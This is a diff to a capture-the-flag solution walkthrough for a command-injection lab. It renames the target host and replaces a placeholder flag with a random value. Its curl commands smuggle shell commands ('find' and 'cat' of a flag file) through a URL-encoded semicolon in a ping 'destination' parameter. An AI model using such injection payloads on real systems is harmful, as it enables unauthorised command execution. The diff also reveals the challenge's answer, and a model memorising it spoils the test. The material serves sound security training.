@@ -16,7 +16,7 @@ Note the destination parameter should be URL encoded.
 Find the flag (if we don't know where it is):
 
 ```
-$ curl "victim_env:8080/network?destination=123.123.123.123%3B%20find%20.%20-name%20flag.txt"
+$ curl "cmd_injection_env:8080/network?destination=123.123.123.123%3B%20find%20.%20-name%20flag.txt"
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -45,7 +45,7 @@ find: ./root: Permission denied
 The flag is in `./home/app/flag.txt`, get it:
 
 ```
-$ curl "victim_env:8080/network?destination=123.123.123.123%3B%20cat%20%2Fhome%2Fapp%2Fflag.txt"
+$ curl "cmd_injection_env:8080/network?destination=123.123.123.123%3B%20cat%20%2Fhome%2Fapp%2Fflag.txt"
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -63,7 +63,7 @@ $ curl "victim_env:8080/network?destination=123.123.123.123%3B%20cat%20%2Fhome%2
 
 --- 123.123.123.123 ping statistics ---
 1 packets transmitted, 0 packets received, 100% packet loss
-REPLACE_ME_WITH_RANDOM_FLAG_7
+avLqauOEBxvpDKI2
 </code>
 </body>
 </html>
